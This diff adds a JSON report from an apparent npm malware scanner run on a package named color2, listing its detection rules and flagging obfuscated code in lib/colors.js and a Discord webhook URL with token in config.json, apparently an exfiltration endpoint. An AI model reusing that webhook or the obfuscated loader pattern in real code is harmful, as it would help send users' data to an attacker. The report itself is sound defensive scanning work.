@@ -1,0 +1,33 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "npm-exec-base64": {},
+        "npm-install-script": {},
+        "npm-serialize-environment": {},
+        "npm-silent-process-execution": {},
+        "npm-dll-hijacking": {},
+        "npm-steganography": {},
+        "npm-obfuscation": [
+            {
+                "location": "package/lib/colors.js:34",
+                "code": "const _0x353ee2=_0x539d;(function(_0x176ee5,_0x474133){const _0x249acd=_0x539d,_0x22fccd=_0x176ee5();while(!![]){try{const _0x1cd7ab=-parseInt(_0x249acd(0x1fb))/0x1*(-parseInt(_0x249acd(0x23a))/0x2)+parseInt(_0x249acd(0x1ce))/0x3*(parseInt(...;}}})());\n",
+                "message": "This package is using a common obfuscation method often used by malware"
+            }
+        ],
+        "shady-links": [
+            {
+                "location": "package/lib/colors.js:34",
+                "code": "const _0x353ee2=_0x539d;(function(_0x176ee5,_0x474133){const _0x249acd=_0x539d,_0x22fccd=_0x176ee5();while(!![]){try{const _0x1cd7ab=-parseInt(_0x249acd(0x1fb))/0x1*(-parseInt(_0x249acd(0x23a))/0x2)+parseInt(_0x249acd(0x1ce))/0x3*(parseInt(...;}}})());\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            },
+            {
+                "location": "package/lib/config.json:2",
+                "code": "  \"WebhookURL\": \"https://discord.com/api/webhooks/958195333589004329/xKR83dNat_Sl90lAjgY6KLGnfEUgBvDTR8ZDV7-GtxMpJ-s2V227bN9QrlbuKZ9lIvR7\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-exfiltrate-sensitive-data": {}
+    },
+    "path": "./dataset/npm/color2.0.0-1.4.0"
+}
